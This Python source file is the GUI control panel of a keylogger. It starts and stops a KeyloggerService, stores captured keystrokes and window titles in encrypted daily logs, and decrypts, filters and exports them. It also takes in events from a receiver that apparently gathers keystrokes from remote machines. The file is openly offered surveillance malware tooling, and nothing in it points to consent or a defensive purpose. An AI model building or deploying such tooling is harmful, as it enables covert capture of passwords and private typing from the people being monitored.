# modules/gui_ctk.py
import os, glob, re, tkinter as tk, queue
import customtkinter as ctk
from tkinter import ttk, filedialog, messagebox
from datetime import datetime
import queue

# ABSOLUTE imports so running "python startup.py" works
from modules.crypto import set_password_for_new_key, encrypt_line, decrypt_line
from modules.keylogger import KeyloggerService

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# === Theme tokens (matched to lianaperry.com) ===
TOKENS = {
    "bg": "#000000",          # page background (pure black)
    "card": "#111111",        # surface
    "card2": "#0d0d0d",       # slightly darker for contrast
    "border": "#262626",      # thin hairline borders
    "text": "#F5F5F5",        # primary text
    "muted": "#9CA3AF",       # muted text
    "accent": "#8B5CF6",      # purple accent
    "accent_hover": "#7C3AED",
}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")  # base; we override per-widget

def style_tree(tree: ttk.Treeview):
    s = ttk.Style()
    s.theme_use("clam")
    s.configure(
        "LP.Treeview",
        background=TOKENS["card2"],
        fieldbackground=TOKENS["card2"],
        foreground=TOKENS["text"],
        borderwidth=0,
        rowheight=26,
    )
    s.configure(
        "LP.Treeview.Heading",
        background=TOKENS["card"],
        foreground=TOKENS["muted"],
        relief="flat",
    )
    s.map(
        "LP.Treeview",
        background=[("selected", TOKENS["accent"])],
        foreground=[("selected", "#ffffff")],
    )
    tree.configure(style="LP.Treeview")

class Pill(ctk.CTkFrame):
    """Subtle pill wrapper for inputs / rows."""
    def __init__(self, master, **kwargs):
        super().__init__(master, fg_color=TOKENS["card"], corner_radius=12, **kwargs)

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Keylogger Control Panel")
        self.geometry("1120x720")
        self.configure(fg_color=TOKENS["bg"])

        # state
        self.base_rows = []
        self.sort_by, self.sort_asc = "time", True
        self._incoming_queue = None
        self._drain_job = None
        self._log_fn = None

        # ========== HEADER ==========
        header = ctk.CTkFrame(self, fg_color=TOKENS["bg"])
        header.pack(fill="x", padx=20, pady=(16, 8))

        brand = ctk.CTkLabel(
            header,
            text="Keylogger Control Panel",
            font=ctk.CTkFont("Segoe UI", size=20, weight="bold"),
            text_color=TOKENS["text"],
        )
        brand.pack(side="left")

        # ========== CONTROLS CARD ==========
        controls = ctk.CTkFrame(self, fg_color=TOKENS["card"], corner_radius=14)
        controls.pack(fill="x", padx=20, pady=(0, 12))
        ctk.CTkFrame(controls, height=1, fg_color=TOKENS["border"]).pack(fill="x", side="bottom")

        row = ctk.CTkFrame(controls, fg_color="transparent")
        row.pack(fill="x", padx=16, pady=14)

        label = ctk.CTkLabel(row, text="Password (for new key):", text_color=TOKENS["muted"])
        label.grid(row=0, column=0, sticky="w", padx=(0, 12))

        self.pw = ctk.CTkEntry(row, width=260, fg_color=TOKENS["card2"], border_color=TOKENS["border"])
        self.pw.grid(row=0, column=1, sticky="w")

        def _btn(*, text, color=TOKENS["accent"], hover=TOKENS["accent_hover"], command=None, w=110):
            return ctk.CTkButton(row, text=text, command=command, width=w,
                                 fg_color=color, hover_color=hover, text_color="#ffffff",
                                 corner_radius=10)

        self.init_btn  = _btn(text="Init Key", command=self.init_key, w=90)
        self.start_btn = _btn(text="Start Logging", command=self.start_logging, w=120)
        self.stop_btn  = _btn(text="Stop Logging", color="#EF4444", hover="#DC2626",
                              command=self.stop_logging, w=120)
        self.stop_btn.configure(state="disabled")

        self.init_btn.grid(row=0, column=2, padx=8)
        self.start_btn.grid(row=0, column=3, padx=8)
        self.stop_btn.grid(row=0, column=4, padx=8)

        self.combine = ctk.CTkSwitch(row, text="Combine typing", progress_color=TOKENS["accent"])
        self.combine.select()
        self.combine.grid(row=0, column=5, padx=(16, 8))

        self.refresh_btn = _btn(text="Refresh Files", color=TOKENS["card2"],
                                hover="#1a1a1a", command=self.refresh_files, w=120)
        self.refresh_btn.grid(row=0, column=6, padx=(8, 0))

        # ========== SEARCH / FILTER CARD ==========
        sf = ctk.CTkFrame(self, fg_color=TOKENS["card"], corner_radius=14)
        sf.pack(fill="x", padx=20, pady=(0, 12))
        ctk.CTkFrame(sf, height=1, fg_color=TOKENS["border"]).pack(fill="x", side="bottom")

        srow = ctk.CTkFrame(sf, fg_color="transparent")
        srow.pack(fill="x", padx=16, pady=12)

        ctk.CTkLabel(srow, text="Search:", text_color=TOKENS["muted"]).grid(row=0, column=0, padx=(0, 12))
        self.search = ctk.CTkEntry(srow, width=320, placeholder_text="Find in time/type/detail…",
                                   fg_color=TOKENS["card2"], border_color=TOKENS["border"])
        self.search.grid(row=0, column=1)
        self.search.bind("<KeyRelease>", lambda e: self._refresh_table())

        ctk.CTkLabel(srow, text="Type:", text_color=TOKENS["muted"]).grid(row=0, column=2, padx=(16, 8))
        self.type_var = tk.StringVar(value="All")
        self.type_menu = ctk.CTkOptionMenu(
            srow, variable=self.type_var, values=["All", "APP", "KEY", "TEXT", "ERR"],
            fg_color=TOKENS["card2"], button_color=TOKENS["card2"], button_hover_color="#1a1a1a",
            command=lambda _: self._refresh_table(), width=100,
        )
        self.type_menu.grid(row=0, column=3)
        self.clear_btn = ctk.CTkButton(
            srow, text="Clear", width=90, fg_color=TOKENS["card2"], hover_color="#1a1a1a",
            command=self._clear_filters
        )
        self.clear_btn.grid(row=0, column=4, padx=(12, 0))

        # ========== BODY (FILES + TABLE) ==========
        body = ctk.CTkFrame(self, fg_color=TOKENS["bg"])
        body.pack(fill="both", expand=True, padx=20, pady=(0, 16))

        # left card
        left = ctk.CTkFrame(body, fg_color=TOKENS["card"], corner_radius=14)
        left.pack(side="left", fill="y", padx=(0, 12), pady=0)
        ctk.CTkLabel(left, text="Encrypted logs", text_color=TOKENS["muted"]).pack(anchor="w", padx=16, pady=(12, 6))

        list_wrap = ctk.CTkFrame(left, fg_color=TOKENS["card"], corner_radius=12)
        list_wrap.pack(padx=12, pady=(0, 10))
        self.file_list = tk.Listbox(
            list_wrap, height=26, width=42, bg=TOKENS["card2"], fg=TOKENS["text"],
            selectbackground=TOKENS["accent"], relief="flat", highlightthickness=0,
            selectforeground="#ffffff"
        )
        self.file_list.grid(row=0, column=0, sticky="ns")
        lscroll = ttk.Scrollbar(list_wrap, orient="vertical", command=self.file_list.yview)
        lscroll.grid(row=0, column=1, sticky="ns")
        self.file_list.config(yscrollcommand=lscroll.set)
        self.file_list.bind("<<ListboxSelect>>", lambda e: self.view_selected())

        ctk.CTkButton(left, text="View Selected", width=180,
                      fg_color=TOKENS["accent"], hover_color=TOKENS["accent_hover"],
                      command=self.view_selected).pack(padx=12, pady=(2, 14))

        # right card
        right = ctk.CTkFrame(body, fg_color=TOKENS["card"], corner_radius=14)
        right.pack(side="left", fill="both", expand=True)
        ctk.CTkLabel(right, text="Decrypted preview", text_color=TOKENS["muted"]).pack(anchor="w", padx=16, pady=(12, 6))

        table_wrap = ctk.CTkFrame(right, fg_color=TOKENS["card"], corner_radius=12)
        table_wrap.pack(fill="both", expand=True, padx=12, pady=(0, 12))

        self.viewer = ttk.Treeview(table_wrap, columns=("time","type","detail"), show="headings", height=26)
        self.viewer.heading("time", text="Time", command=lambda: self._set_sort("time"))
        self.viewer.heading("type", text="Type", command=lambda: self._set_sort("type"))
        self.viewer.heading("detail", text="Detail", command=lambda: self._set_sort("detail"))
        self.viewer.column("time", width=230, anchor="w")
        self.viewer.column("type", width=80, anchor="center")
        self.viewer.column("detail", width=720, anchor="w")
        style_tree(self.viewer)
        self.viewer.pack(fill="both", expand=True, side="left")

        tscroll = ttk.Scrollbar(table_wrap, orient="vertical", command=self.viewer.yview)
        tscroll.pack(side="right", fill="y")
        self.viewer.configure(yscrollcommand=tscroll.set)

        # status
        self.status = ctk.CTkLabel(self, text="Ready", text_color=TOKENS["muted"])
        self.status.pack(anchor="w", padx=22, pady=(0, 6))

        # service (local capture; keep for your legacy workflow)
        self.logger = KeyloggerService(self._on_keylog, combine=True, idle_ms=800)
        self.refresh_files()

    # ====== actions ======
    def init_key(self):
        try:
            set_password_for_new_key(self.pw.get())
            self.status.configure(text="Key initialized (or already present).")
        except Exception as e:
            messagebox.showerror("Key init failed", str(e))

    def _on_keylog(self, plaintext_line: str):
        token = encrypt_line(plaintext_line)
        date_str = datetime.now().strftime("%Y-%m-%d")
        path = os.path.join(LOG_DIR, f"keylog-{date_str}.txt.enc")
        with open(path, "ab") as f:
            f.write(token + b"\n")

    def start_logging(self):
        try:
            self.logger.combine = bool(self.combine.get())
            self.logger.start()
            self.start_btn.configure(state="disabled")
            self.stop_btn.configure(state="normal")
            self.status.configure(text="Logging started.")
        except Exception as e:
            messagebox.showerror("Start failed", str(e))

    def stop_logging(self):
        self.logger.stop()
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.status.configure(text="Logging stopped.")

    def refresh_files(self):
        self.file_list.delete(0, "end")
        files = sorted(glob.glob(os.path.join(LOG_DIR, "keylog-*.txt.enc")))
        for f in files:
            self.file_list.insert("end", os.path.basename(f))
        self.status.configure(text=f"Found {len(files)} encrypted log(s).")

    def _selected_path(self):
        sel = self.file_list.curselection()
        if not sel: return None
        return os.path.join(LOG_DIR, self.file_list.get(sel[0]))

    # ====== table helpers ======
    def _parse_line(self, line: str):
        if " | " in line:
            try:
                ts, exe, title = line.split(" | ", 2)
                return ts, "APP", f"{exe} — {title}"
            except ValueError:
                pass
        m = re.match(r"^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}).*? - (.+)$", line)
        if m:
            ts, key = m.groups()
            key = key.strip()
            if key.startswith("[") and key.endswith("]"):
                key = key[1:-1].replace("_", " ").title()
            return ts, "KEY", key
        return "", "TEXT", line.strip()

    def view_selected(self):
        path = self._selected_path()
        if not path: return
        try:
            rows = []
            with open(path, "rb") as f:
                for line in f:
                    line = line.strip()
                    if not line: continue
                    try:
                        rows.append(self._parse_line(decrypt_line(line)))
                    except Exception as e:
                        rows.append(("", "ERR", f"decrypt error: {e}"))
            self.base_rows = rows
            self._refresh_table()
            self.status.configure(text=f"Viewed: {os.path.basename(path)} — {len(rows)} entries")
        except Exception as e:
            messagebox.showerror("View failed", str(e))

    def _clear_filters(self):
        self.search.delete(0, "end")
        self.type_var.set("All")
        self._refresh_table()

    def _set_sort(self, field):
        if self.sort_by == field:
            self.sort_asc = not self.sort_asc
        else:
            self.sort_by, self.sort_asc = field, True
        self._refresh_table()

    def _refresh_table(self):
        tfilter = self.type_var.get()
        rows = [r for r in self.base_rows if tfilter == "All" or r[1] == tfilter]

        q = (self.search.get() or "").strip().lower()
        if q:
            rows = [r for r in rows if q in (r[0] + " " + r[1] + " " + r[2]).lower()]

        key_funcs = {"time": lambda r: r[0], "type": lambda r: r[1], "detail": lambda r: r[2].lower()}
        rows.sort(key=key_funcs[self.sort_by], reverse=not self.sort_asc)

        for r in self.viewer.get_children(): self.viewer.delete(r)
        for i, (ts, kind, detail) in enumerate(rows):
            self.viewer.insert("", "end", values=(ts, kind, detail))

    # ====== export ======
    def export_selected(self):
        path = self._selected_path()
        if not path:
            messagebox.showwarning("No file", "Select an encrypted log first."); return
        out = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files","*.txt"),("All files","*.*")],
            initialfile=os.path.basename(path).replace(".enc","")
        )
        if not out: return
        try:
            with open(path, "rb") as f_in, open(out, "w", encoding="utf-8") as f_out:
                for line in f_in:
                    line = line.strip()
                    if not line: continue
                    f_out.write(decrypt_line(line) + "\n")
            self.status.configure(text=f"Exported to: {out}")
        except Exception as e:
            messagebox.showerror("Export failed", str(e))

    # ====== incoming event queue (from startup.py receiver) ======
    def attach_event_queue(self, q, log_fn=None):
        """
        Called by startup.py:
          q supplies dict events like {"ts","window","key","type","_remote"}
        """
        self._incoming_queue = q
        self._log_fn = log_fn
        # start draining only once the queue exists
        if not self._drain_job:
            self._drain_job = self.after(100, self._drain_incoming_events)
        try:
            self.status.configure(text="Receiving events…")
        except Exception:
            pass

    def _append_row(self, evt: dict):
        """Normalise an incoming event and insert into the live table, and persist."""
        import datetime as _dt

        ts = evt.get("ts") or _dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        kind = (evt.get("type") or "KEY").upper()

        # detail preference: key > text > window > generic
        detail = (
            (str(evt.get("key")) if evt.get("key") is not None else None) or
            (str(evt.get("text")) if evt.get("text") is not None else None) or
            (str(evt.get("window")) if evt.get("window") is not None else None) or
            ""
        )

        # show live
        self.viewer.insert("", "end", values=(ts, kind, detail))

        # persist to encrypted daily file using your plaintext format
        # (your _parse_line recognizes "YYYY-MM-DD HH:MM:SS - <detail>")
        try:
            if not evt.get("_already_logged"):
                self._on_keylog(f"{ts} - {detail}")
                evt["_already_logged"] = True
        except Exception:
            pass

    def _drain_incoming_events(self):
        """Poll the unified incoming queue without blocking, update GUI + logs."""
        from queue import Empty  # local import to avoid global dependency if missing
        q = self._incoming_queue
        if q is not None:
            try:
                while True:
                    evt = q.get_nowait()      # raises Empty when drained
                    self._append_row(evt)
                    # optional second sink: plaintext JSON log
                    try:
                        if self._log_fn and not evt.get("_already_logged"):
                            import datetime as _dt
                            self._log_fn({**evt, "logged_at": _dt.datetime.utcnow().isoformat() + "Z"})
                            evt["_already_logged"] = True
                    except Exception:
                        pass
            except Empty:
                pass
        # reschedule regardless (so the loop keeps running even if queue was empty)
        self._drain_job = self.after(100, self._drain_incoming_events)


def main():
    App().mainloop()

if __name__ == "__main__":
    main()
